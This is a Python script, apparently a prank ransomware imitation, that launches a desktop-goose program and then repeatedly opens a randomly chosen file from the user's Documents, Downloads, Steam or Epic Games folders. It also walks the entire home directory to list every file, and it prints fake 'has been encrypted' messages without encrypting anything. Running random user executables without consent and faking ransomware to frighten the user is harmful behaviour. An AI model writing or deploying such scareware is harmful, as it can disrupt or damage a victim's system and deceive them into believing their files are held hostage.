import os
import random
import platform
import subprocess
import time
from random import randint


def goose():
    os.startfile(r'C:\Users\jkjones\PycharmProjects\ran-some-wear\DesktopGoose v0.31\GooseDesktop.exe')
def get_random_directory(root_directory):
    # List of main target folders to search within
    main_target_folders = ['Documents', 'Downloads']

    # List of additional target folders to search within
    additional_target_folders = []

    # Check if Steam is installed
    if platform.system() == 'Windows':
        steam_path = os.path.join(os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'), 'Steam\\steamapps\common')
        print(steam_path)
    else:  # Linux
        steam_path = os.path.expanduser('~/.steam/steam')

    if os.path.isdir(steam_path):
        additional_target_folders.append(steam_path)

    # Check if Epic Games is installed
    if platform.system() == 'Windows':
        epic_path = os.path.join(os.environ.get('ProgramFiles'), 'Epic Games')
    else:  # Linux
        epic_path = os.path.expanduser('~/.epicgames')

    if os.path.isdir(epic_path):
        additional_target_folders.append(epic_path)

    # Initialize an empty list to store the directories found within target folders
    directories = []

    # Search within additional target folders
    for folder in additional_target_folders:
        if os.path.isdir(folder):
            for item in os.listdir(folder):
                item_path = os.path.join(folder, item)
                if os.path.isdir(item_path):
                    directories.append(item_path)

    # Search within main target folders
    for folder in main_target_folders:
        folder_path = os.path.join(root_directory, folder)

        if os.path.isdir(folder_path):
            for item in os.listdir(folder_path):
                item_path = os.path.join(folder_path, item)
                if os.path.isdir(item_path):
                    directories.append(item_path)

    if not directories:
        return None  # Return None if no directories are found

    # Select a random directory
    random_directory = random.choice(directories)
    return random_directory
def get_random_executable_path(directory):
    # Get a list of all files in the specified directory
    files = os.listdir(directory)

    # Filter the files to include only executable files with specific extensions
    executable_extensions = ['.dmg', '.exe', '.bat', '.cmd', '.app', '.sh', '.png', '.jpg', '.jpeg', '.webp','.txt']
    executable_files = [file for file in files if os.path.isfile(os.path.join(directory, file)) and
                        os.access(os.path.join(directory, file), os.X_OK) and
                        any(file.endswith(extension) for extension in executable_extensions)]

    if not executable_files:
        return None  # Return None if no executable files are found

    # Select a random executable file
    random_executable = random.choice(executable_files)

    # Get the absolute path of the random executable file
    absolute_path = os.path.abspath(os.path.join(directory, random_executable))

    return absolute_path
def mspaint():
    try:
        subprocess.Popen(['mspaint'])
        print("MS Paint has been opened.")
    except FileNotFoundError:
        print("MS Paint is not found on this system.")
def run():
    # Get the user's home directory
    home_directory = os.path.expanduser('~')

    # Set a flag to indicate if an executable file is found
    executable_found = False

    while not executable_found:
        # Get a random directory path within the target folders
        random_directory_path = get_random_directory(home_directory)

        if random_directory_path:
            print("Random Directory Path:", random_directory_path)

            try:
                # Get a random executable path within the random directory
                random_executable_path = get_random_executable_path(random_directory_path)
            except:
                random_executable_path = None

            if random_executable_path:
                print("Random Executable Path:", random_executable_path)
                # Execute the random executable file (use with caution!)
                try:
                    os.startfile(random_executable_path)
                    executable_found = True
                except:
                    print('pissing myself')


            else:
                print("No executable files found in the random directory.")
        else:
            print("No directories found in the target folders.")
            break
def ermm():
    file_paths = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            file_path = os.path.join(root, file)
            file_paths.append(file_path)
    return file_paths, len(file_paths)

def encrypt(file):
    time.sleep(randint(0,10)/10)
    print(f'{file} has been encrypted :3')